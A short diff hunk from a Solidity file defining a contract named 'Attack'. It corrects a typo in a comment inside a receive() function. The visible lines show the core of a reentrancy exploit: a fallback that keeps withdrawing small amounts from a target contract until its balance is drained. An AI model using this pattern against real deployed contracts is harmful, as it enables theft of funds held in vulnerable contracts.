@@ -27,7 +27,7 @@ contract Attack {
     receive() external payable {
         uint256 balance = target.balanceOf(address(this)); // retrieve our balance in the target
 
-        // withdraw the smallest amount, so that the tx doesn; get reverted
+        // withdraw the smallest amount, so that the tx doesn't get reverted
         uint256 withdrawableAmount = balance < 0.001 ether ? balance : 0.001 ether;
 
         if (withdrawableAmount > 0) { // if contract balance is 0, then termination condition is met
